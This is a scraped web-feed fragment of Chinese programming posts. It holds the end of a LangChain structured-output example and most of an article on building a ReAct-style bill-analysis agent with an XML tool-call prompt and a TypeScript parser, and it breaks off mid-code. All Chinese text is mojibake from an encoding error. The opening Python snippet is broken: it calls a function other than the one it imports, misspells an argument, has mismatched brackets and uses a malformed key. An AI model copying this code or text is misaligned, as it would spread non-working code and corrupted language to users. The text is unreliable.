<p>å¯ä»¥å°†åŸå§‹å“åº”ä¸è§£æåçš„è¡¨ç¤ºä¸€èµ·è¿”å›ï¼Œå¯åœ¨è°ƒç”¨ with_structured_output æ—¶è®¾ç½® include_raw=True æ¥å®ç°ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os Â  
<span class="hljs-keyword">from</span> langchain.chat_models <span class="hljs-keyword">import</span> init_chat_model Â  
llm=init_chatting_model( 
    model=<span class="hljs-string">"openai/gpt-oss-20b:free"</span>, 
    modelprovider=<span class="hljs-string">"openai"</span>, 
    base_url= <span class="hljs-string">"https://openrouter.ai/api/v1"</span>, 
    api_key=os.getenv(<span class="hljs-string">"OPENROUTER_API_KEY"</span>) Â  
) Â  
schema = {
Â  Â  <span class="hljs-string">"name"</span>: <span class="hljs-string">"animal_list"</span>,
Â  Â  <span class="hljs-string">"schema"</span>: {
Â  Â  Â  Â  <span class="hljs-string">"type"</span>: <span class="hljs-string">"array"</span>,
Â  Â  Â  Â  <span class="hljs-string">"items"</span>: {
Â  Â  Â  Â  Â  Â  <span class="hljs-string">"type"</span>: <span class="hljs-string">"object"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-string">"properties"</span>: {
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-string">"animal"</span>: {<span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span>, <span class="hljs-string">"description"</span>: <span class="hljs-string">"åŠ¨ç‰©åç§°"</span>},
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-string">"emoji"</span>: {<span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span>, <span class="hljs-string">"description"</span>: <span class="hljs-string">"åŠ¨ç‰©çš„emojiè¡¨æƒ…"</span>},
Â  Â  Â  Â  Â  Â  },
Â  Â  Â  Â  Â  Â  <span class="hljs-string">"required"</span>: [<span class="hljs-string">"animal"</span>, <span class="hljs-string">"emoji"</span>],
Â  Â  Â  Â  },
Â  Â  },
} Â 
messages = [<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä»»æ„ç”Ÿæˆä¸‰ç§åŠ¨ç‰©ï¼Œä»¥åŠä»–ä»¬çš„emojiè¡¨æƒ…"</span>]} Â 
llm_with_structured_output = llm.with_structured_output(schema, method=<span class="hljs-string">"json_schema"</span>, include_raw=<span class="hljs-literal">True</span>) Â 
resp = llm_with_structured_output.invoke(messages) Â 
<span class="hljs-built_in">print</span>(resp) Â 
<span class="hljs-built_in">print</span>(resp[<span class="hljs-string">"raw"</span>)] Â 
<span class="hljs-built_in">print</span>(resp[<span class="hljs-string">" parsed"</span>)] Â 
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶å¼€å§‹ç¼–å†™è‡ªå·±çš„AIè´¦å•Agent]]></title>    <link>https://juejin.cn/post/7594315259463630883</link>    <guid>https://juejin.cn/post/7594315259463630883</guid>    <pubDate>2026-01-13T03:28:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259463630883" data-draft-id="7594303825015160847" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶å¼€å§‹ç¼–å†™è‡ªå·±çš„AIè´¦å•Agent"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹,Agent"/> <meta itemprop="datePublished" content="2026-01-13T03:28:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Glink"/> <meta itemprop="url" content="https://juejin.cn/user/2885556238035447"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶å¼€å§‹ç¼–å†™è‡ªå·±çš„AIè´¦å•Agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2885556238035447/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Glink
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:28:37.000Z" title="Tue Jan 13 2026 03:28:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a793693d21504c18b337552911c15c22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2xpbms=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768879717&amp;x-signature=w4nQsjZnps5BfHzN8GaYLWg%2B1V4%3D" alt="cent-ai.jpg" loading="lazy"/></p>
<blockquote>
<p>AIæ—¶ä»£ï¼Œå¾ˆéš¾æƒ³è±¡è®°è´¦Appè¿˜æ²¡æœ‰ç”¨AIå¸®è‡ªå·±åˆ†æè´¦å•çš„åŠŸèƒ½</p>
</blockquote>
<p>èµ·å› æ˜¯æœ‰å°ä¼™ä¼´é—®ï¼Œèƒ½ä¸èƒ½ç»™CentåŠ ä¸ŠAIè®°è´¦åˆ†æçš„åŠŸèƒ½ï¼Œä¸€å¼€å§‹æˆ‘è§‰å¾—è¿™å½“ç„¶æ²¡é—®é¢˜äº†ï¼Œå®åœ¨æ˜¯å¤ªç®€å•äº†ï¼Œä¸å°±æ˜¯åŠ ä¸€ä¸ªèŠå¤©æ¡†ï¼Œç„¶åé¢„è®¾ä¸€äº›æç¤ºè¯å‘ç»™AIï¼Œç„¶åå°±æˆäº†å˜›ï¼Œäºæ˜¯æˆ‘ç›´æ¥å¼€å†™ã€‚</p>
<p>å½“æˆ‘æŠŠæ•´ä½“æµç¨‹å­å“§å­å“§å†™å®Œäº†ï¼Œç‚¹å‡»å‘é€æŒ‰é’®ä¸€çœ‹ï¼ŒAIè¿”å›äº†ä¸€ä¸ªå¤§å¤§çš„é—®å·ï¼š</p>
<blockquote>
<p>å¥½çš„ï¼Œè¯·æä¾›æ‚¨çš„è´¦å•æ•°æ®ï¼Œæˆ‘å°†ä¼šå°½åŠ›ä¸ºä½ è¿›è¡Œåˆ†æ</p>
</blockquote>
<p>æˆ‘æ‰æƒ³èµ·å¿˜äº†æŠŠè´¦å•æ•°æ®ä¹Ÿä¸€èµ·å‘è¿‡å»ï¼Œè¿™å¥½åŠï¼Œæˆ‘ç›´æ¥åœ¨systemPrompté‡Œå¼€å†™ï¼š</p>
<blockquote>
<p>ä¸‹é¢æ˜¯ç”¨æˆ·çš„è´¦å•æ•°æ®ï¼š</p>
</blockquote>
<p>è¿™æ—¶æˆ‘é©¬ä¸Šæ„è¯†åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯å¦‚æœçœŸçš„æŠŠè´¦å•æ•°æ®ä¸€è‚¡è„‘ä¼ ç»™AIï¼Œå‡è®¾ç”¨æˆ·ä¸€å¤©äº§ç”Ÿ5æ¡è´¦å•ï¼Œä¸€ä¸ªæœˆå°±æ˜¯150æ¡ï¼Œä¸€å¹´å°±æ˜¯1000+æ¡æ•°æ®ï¼Œè¿™ä¹ˆå¤šæ•°æ®ä¼ è¿‡å»ï¼Œå…ˆä¸è¯´tokenæ¶ˆè€—æ•°ç›´æ¥çˆ†ç‚¸ï¼ŒTransformeræ³¨æ„åŠ›æœºåˆ¶ä¸‹ï¼Œè¿™ä¹ˆå¤šæ•°æ®AIèƒ½å¦åˆ†ææˆåŠŸä¹Ÿæ˜¯ä¸ªæœªçŸ¥æ•°ï¼Œä¿ä¸é½å°±å¼€å§‹èƒ¡è¯Œä¸€ä¸ªå¹³å‡æ”¯å‡ºï¼Œæˆ–è€…æŠŠå¼€å§‹çš„æ•°æ®å¿˜å¾—ä¸€å¹²äºŒå‡€äº†ã€‚</p>
<p>ç›´æ¥æŠŠè´¦å•æ•°æ®ä¼ ç»™AIæ˜¾ç„¶æ˜¯ä¸åˆç†çš„ï¼Œäºæ˜¯æˆ‘æƒ³åˆ°äº†ç›®å‰æœ€çƒ­é—¨çš„Curosrã€Manusç­‰AIå·¥å…·ï¼Œå®ƒä»¬æ˜¯å¦‚ä½•è§£å†³ä¸Šä¸‹æ–‡é—®é¢˜çš„å‘¢ï¼Ÿäºæ˜¯æˆ‘å¼€å§‹é—®Geminiï¼Œæ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªå…³é”®è¯ï¼š<strong>ReAct</strong>ã€‚</p>
<h2 data-id="heading-0">ReAct</h2>
<p>æ­¤ReActå½“ç„¶ä¸æ˜¯å‰ç«¯ç”¨çš„å½¼Reactï¼Œè€Œæ˜¯ä¸€ç§å…¨æ–°çš„AIä¸Šä¸‹æ–‡å¤„ç†æ¶æ„ï¼ŒGeminiè§£é‡Šå¦‚ä¸‹ï¼š</p>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼Œ<strong>ReAct</strong>Â æ˜¯Â <strong>Reasonï¼ˆæ¨ç†ï¼‰</strong> Â +Â <strong>Actï¼ˆæ“ä½œï¼‰</strong> Â çš„ç¼©å†™ã€‚</p>
<p>å®ƒæ˜¯å¤§æ¨¡å‹ï¼ˆLLMï¼‰çš„ä¸€ç§å·¥ä½œæ¨¡å¼ï¼Œè®©æ¨¡å‹åœ¨æ‰§è¡Œå¤æ‚ä»»åŠ¡æ—¶ï¼Œä¸ä»…ä¼šâ€œæƒ³â€ï¼Œè¿˜ä¼šâ€œåšâ€ã€‚</p>
<p><strong>æ ¸å¿ƒåŸç†</strong></p>
<p>ReAct æ¨¡ä»¿äººç±»è§£å†³é—®é¢˜çš„æ€ç»´è¿‡ç¨‹ï¼Œé€šè¿‡ä¸€ä¸ªå¾ªç¯çš„åé¦ˆé“¾æ¡æ¥å®ç°ï¼š</p>
<ol>
<li><strong>Thoughtï¼ˆæ€è€ƒï¼‰ï¼š</strong> Â æ¨¡å‹åˆ†æå½“å‰ä»»åŠ¡ï¼Œæ€è€ƒä¸‹ä¸€æ­¥è¯¥åšä»€ä¹ˆã€‚</li>
<li><strong>Actionï¼ˆè¡ŒåŠ¨ï¼‰ï¼š</strong> Â æ¨¡å‹è°ƒç”¨å¤–éƒ¨å·¥å…·ï¼ˆå¦‚æœç´¢ç½‘é¡µã€æŸ¥è¯¢æ•°æ®åº“ã€è®¡ç®—å™¨ï¼‰ã€‚</li>
<li><strong>Observationï¼ˆè§‚å¯Ÿï¼‰ï¼š</strong> Â æ¨¡å‹é˜…è¯»å·¥å…·è¿”å›çš„ç»“æœï¼Œå¹¶æ®æ­¤ä¿®æ­£æˆ–ç»§ç»­ä¸‹ä¸€æ­¥æ¨ç†ã€‚</li>
</ol>
<hr/>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒ</strong></p>
<ul>
<li><strong>å¼¥è¡¥ç¼ºé™·ï¼š</strong> Â LLM æœ‰æ—¶ä¼šâ€œä¸€æœ¬æ­£ç»èƒ¡è¯´å…«é“â€ï¼Œä¸”æ— æ³•è·å–å®æ—¶ä¿¡æ¯ã€‚</li>
<li><strong>é€»è¾‘é—­ç¯ï¼š</strong> Â é€šè¿‡â€œè§‚å¯Ÿâ€å¤–éƒ¨äº‹å®ï¼Œæ¨¡å‹èƒ½è‡ªæˆ‘çº é”™ï¼Œä»è€Œæ›´ç²¾å‡†åœ°è¾¾æˆç›®æ ‡ã€‚</li>
</ul>
<p><strong>ä¸€å¥è¯æ€»ç»“ï¼š</strong> Â ReAct æ˜¯ç»™å¤§æ¨¡å‹è£…ä¸Šäº†â€œå¤§è„‘ï¼ˆé€»è¾‘ï¼‰â€å’Œâ€œåŒæ‰‹ï¼ˆå·¥å…·ï¼‰â€ï¼Œè®©å®ƒé€šè¿‡<strong>è¾¹æƒ³è¾¹åš</strong>æ¥è§£å†³é—®é¢˜ã€‚</p>
</blockquote>
<p>åŸç†å¾ˆç®€å•ï¼Œç°åœ¨å„å®¶AIå‚å•†éƒ½åœ¨ç”¨çš„MCPã€Skillsæ¨¡å¼ï¼Œå…¶å®éƒ½æ˜¯ä¸ºäº†æ›´å¥½åœ°è®©å¤§æ¨¡å‹éµå¾ªä¸€å®šçš„æ­¥éª¤ï¼Œæ¥ä¾åˆ†æ­¥å®Œæˆå¤æ‚ä»»åŠ¡ï¼Œè€Œä¸ºäº†å®ç°ReActï¼Œå°†ä¸ç¡®å®šçš„å¤§æ¨¡å‹å›ç­”è½¬æ¢ä¸ºç¡®å®šçš„æ•°æ®æ”¶é›†å·¥ä½œï¼Œå°±éœ€è¦è®©å¤§æ¨¡å‹èƒ½å¤Ÿè°ƒç”¨ç¡®å®šçš„â€œåŠŸèƒ½â€ï¼Œå°†è¿™äº›â€œåŠŸèƒ½â€çš„è¾“å‡ºæä¾›ç»™å¤§æ¨¡å‹ï¼Œè€Œä¸æ˜¯ä¸€è‚¡è„‘æŠŠæ‰€æœ‰æ•°æ®ä¸¢ç»™å®ƒï¼Œè¿™æ ·å°±èƒ½æœ€å¤§åŒ–å‡å°‘tokençš„æ¶ˆè€—ï¼Œä»¥åŠé¿å…å¹»è§‰ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¸¦æ¥æ›´å¥½çš„æ‰§è¡Œç»“æœã€‚</p>
<p>åœ¨Centä¸­ï¼Œè´¦å•æ•°æ®æ˜¯ååˆ†ç¡®å®šçš„ï¼Œç»Ÿè®¡å’Œåˆ†æåŠŸèƒ½ä¹Ÿæ˜¯ç°æˆçš„ï¼Œå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯è¯¥å¦‚ä½•è®©å¤§æ¨¡å‹äº†è§£å’Œä½¿ç”¨è¿™äº›ç°æˆçš„å·¥å…·äº†ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•å®ç°ç®€å•çš„ReActæ¨¡å¼å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">Function Call</h2>
<p>Geminiç»™çš„æ–¹å¼éå¸¸ç®€å•ï¼Œè®©å¤§æ¨¡å‹éµå¾ªfunction callæ ¼å¼çš„è¾“å‡ºï¼Œç„¶ååœ¨è‡ªå·±çš„è§£æä»£ç ä¸­å®ç°è°ƒç”¨å°±å¯ä»¥äº†ã€‚Function callæ˜¯Open AIå¾ˆæ—©å‰æå‡ºçš„ä¸€å¥—ç”¨äºè§„èŒƒå¤§æ¨¡å‹è¾“å‡ºçš„æç¤ºè¯å·¥ç¨‹ï¼Œæ—¨åœ¨è®©å¤§æ¨¡å‹è¿”å›æ ‡å‡†åŒ–çš„jsonç»“æ„ï¼Œç„¶åé€šè¿‡è§£æjsonæ¥è·å–ç¡®å®šæ ¼å¼çš„è¾“å‡ºï¼Œæ–¹ä¾¿è°ƒç”¨æ ‡å‡†åŒ–çš„å‡½æ•°ï¼Œå…¶å·¥ä½œåŸç†ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å…ˆä¸ºè‡ªå·±çš„å·¥å…·å‡½æ•°å®šä¹‰ä¸€å¥—æ ‡å‡†çš„JSONæè¿°ï¼Œä¾‹å¦‚å‡½æ•°åç§°ï¼Œå‡½æ•°å‚æ•°ï¼Œæ¯ä¸ªå‚æ•°çš„ä½œç”¨ï¼Œè¿”å›å€¼çš„å®šä¹‰ç­‰ï¼Œç›¸å½“äºç»™å‡½æ•°ä¸€ä¸ªå¤§æ¨¡å‹çœ‹å¾—æ‡‚çš„æ³¨é‡Šï¼Œç„¶åå†è¦æ±‚å¤§æ¨¡å‹åœ¨éœ€è¦è°ƒç”¨å·¥å…·è·å–ä¿¡æ¯çš„æ—¶å€™ï¼ŒæŒ‰ç…§ç»™å®šçš„jsonæ ¼å¼è¾“å‡ºï¼Œè¿™æ ·é€šè¿‡è§£æå¤§æ¨¡å‹çš„è¾“å‡ºï¼Œå°±å¯ä»¥çŸ¥é“å¤§æ¨¡å‹è¦å¦‚ä½•è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œå†å°†å‡½æ•°æ‰§è¡Œç»“æœé‡æ–°è¿”å›ç»™å¤§æ¨¡å‹ï¼Œå°±å®ç°äº†å¤§æ¨¡å‹â€œè°ƒç”¨â€å·¥å…·çš„ç»“æœã€‚</p>
<p>Geminiå¾ˆå¿«å°±ç»™å‡ºäº†ä¸€å¥—å®Œå–„çš„function callçš„æç¤ºè¯ï¼Œä»¥åŠå¯¹åº”çš„è§£ææ–¹å¼ï¼Œçœ‹èµ·æ¥å¾ˆå®Œç¾ï¼Œä½†æ˜¯å½“æˆ‘æŠŠè¿™å¥—æç¤ºè¯å‘é€ç»™å¤§æ¨¡å‹æ—¶ï¼Œåˆå‡ºå²”å­äº†ï¼Œå¤§æ¨¡å‹æ ¹æœ¬å°±æ²¡æŒ‰æˆ‘ç»™çš„æ ¼å¼æ¥ï¼Œè€Œæ˜¯è‡ªé¡¾è‡ªåœ°æŠŠOpen AIé‚£ä¸€å¥—pythonæ ¼å¼çš„function callè°ƒç”¨æ–¹å¼è¿”å›äº†ï¼Œç†æ‰€å½“ç„¶è§£æå¤±è´¥ã€‚</p>
<h2 data-id="heading-2">æç¤ºè¯æ”¹è¿›</h2>
<p>æˆ‘ç”¨çš„å¤§æ¨¡å‹æ˜¯æ™ºè°±GLM flashç³»åˆ—ï¼Œå®ƒçš„â€œæ™ºåŠ›â€æ˜¾ç„¶æ¯”ä¸ä¸Šç›®å‰çš„é—­æºå¤§æ¨¡å‹ï¼Œç›®å‰çš„æç¤ºè¯çº¦æŸåŠ›æ˜¾ç„¶ä¸å¤ªå¤Ÿï¼Œè€Œä¸”å¾ˆæ˜æ˜¾å®ƒè¢«è®­ç»ƒè¿‡ç¨‹çš„Open AIç‰ˆæœ¬çš„function callåè®®æ±¡æŸ“äº†ï¼Œä¸€ç›´æŒ‰ç…§Open AIçš„æ ¼å¼æ¥ï¼Œè€Œå¯¹æˆ‘çš„â€œç®€åŒ–ç‰ˆâ€åè®®ç½®è‹¥ç½”é—»ã€‚æˆ‘åªèƒ½å®Œå…¨æ”¾å¼ƒæåˆ°function callï¼Œé‡æ–°è®¾è®¡ä¸€å¥—æ›´ç®€æ´çš„â€œåè®®â€ï¼Œå³æœ€ç»ˆç‰ˆï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># å¼ºåˆ¶è¾“å‡ºæ ¼å¼</span>
æ‰€æœ‰å›ç­”å¿…é¡»åŒ…å«åœ¨å¯¹åº”çš„ XML æ ‡ç­¾ä¸­ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">TITLE</span>&gt;</span></span>æ­¤å¤„ä¸ºç®€çŸ­æ ‡é¢˜<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">TITLE</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Thought</span>&gt;</span></span>
æ­¤å¤„è®°å½•ä½ çš„æ€è€ƒè¿‡ç¨‹ã€‚
<span class="hljs-bullet">1.</span> åˆ†æç”¨æˆ·æ„å›¾ã€‚
<span class="hljs-bullet">2.</span> å†³ç­–ï¼šæ˜¯å®è§‚ç»Ÿè®¡(analyze)è¿˜æ˜¯å¾®è§‚æŸ¥è¯¢(query)ï¼Ÿ
<span class="hljs-bullet">3.</span> ç¡®å®šæ‰€éœ€çš„å‚æ•°ã€‚
<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Thought</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Tool</span>&gt;</span></span>
function=å·¥å…·åç§°
å‚æ•°å1=å‚æ•°å€¼1
å‚æ•°å2=å‚æ•°å€¼2
<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Tool</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Answer</span>&gt;</span></span>
æœ€ç»ˆçš„è¾“å‡º
<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Answer</span>&gt;</span></span>
</code></pre>
<p>äº‹å®è¯æ˜ï¼Œxmlç‰ˆçš„åè®®å¯¹äºå°ä½“é‡æ¨¡å‹æ¥è¯´ï¼Œçº¦æŸåŠ›æ›´å¼ºï¼Œä¹Ÿæ›´ä¸å®¹æ˜“ç”Ÿæˆå‡ºé”™ï¼Œå¹¶ä¸”è§£æä»£ç ä¹Ÿå¯ä»¥æ›´åŠ ç®€æ´ï¼Œä¹Ÿæ›´å®½å®¹ï¼Œä¹‹å‰ç”Ÿæˆjsonçš„æ—¶å€™å¾ˆå®¹æ˜“å‡ºç°åŒ¹é…æ—¶å¤šåŒ¹é…äº†ä¸ªå¼•å·æˆ–è€…å¤§æ‹¬å·å¯¼è‡´è§£æå¤±è´¥ï¼Œæ¢æˆxmlä¹‹ååªç”¨æ­£åˆ™å°±å¯ä»¥ç²¾å‡†åŒ¹é…æƒ³è¦çš„å†…å®¹ï¼Œè€Œä¸”æ‹“å±•æ€§ä¹Ÿæ›´å¼ºäº†ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * å¥å£®çš„ XML æ ‡ç­¾è§£æå™¨ (Loose Parsing)
 * å³ä½¿ç¼ºå°‘é—­åˆæ ‡ç­¾æˆ–æ ¼å¼ç¨æœ‰åå·®ä¹Ÿèƒ½å°è¯•æå–
 */</span>
<span class="hljs-comment">/**
 * å¢å¼ºåçš„è§£æå™¨ï¼šæ”¯æŒ Answer æ ‡ç­¾çš„æå–ä¸æ¸…æ´—
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">parseStandardResponse</span>(<span class="hljs-params">response: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">ParsedResponse</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">extractTag</span> = (<span class="hljs-params">tag: <span class="hljs-built_in">string</span>, input: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-comment">// åŒ¹é… &lt;Tag&gt;å†…å®¹&lt;/Tag&gt; æˆ– &lt;Tag&gt;å†…å®¹ (æ”¯æŒæœªé—­åˆæƒ…å†µ)</span>
        <span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">`&lt;<span class="hljs-subst">${tag}</span>&gt;([\s\S]*?)(?:&lt;\/<span class="hljs-subst">${tag}</span>&gt;|$)`</span>, <span class="hljs-string">"i"</span>);
        <span class="hljs-keyword">const</span> match = input.<span class="hljs-title function_">match</span>(regex);
        <span class="hljs-keyword">return</span> match ? match[<span class="hljs-number">1</span>].<span class="hljs-title function_">trim</span>() : <span class="hljs-literal">undefined</span>;
    };

    <span class="hljs-keyword">const</span> title = <span class="hljs-title function_">extractTag</span>(<span class="hljs-string">"TITLE"</span>, response);
    <span class="hljs-keyword">const</span> thought = <span class="hljs-title function_">extractTag</span>(<span class="hljs-string">"Thought"</span>, response);
    <span class="hljs-keyword">const</span> toolRaw = <span class="hljs-title function_">extractTag</span>(<span class="hljs-string">"Tool"</span>, response);
    <span class="hljs-keyword">const</span> answerTagContent = <span class="hljs-title function_">extractTag</span>(<span class="hljs-string">"Answer"</span>, response); <span class="hljs-comment">// æ–°å¢ï¼šæå– Answer æ ‡ç­¾å†…å®¹</span>

    <span class="hljs-keyword">let</span> toolCall = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (toolRaw) {
        toolCall = <span class="hljs-title function_">parseToolContent</span>(toolRaw);
    }

    <span class="hljs-comment">// æ¸…æ´—é€»è¾‘ï¼šç§»é™¤æ‰€æœ‰ XML å—ï¼ŒåŒ…æ‹¬ Answer</span>
    <span class="hljs-keyword">const</span> cleanedRemainder = response
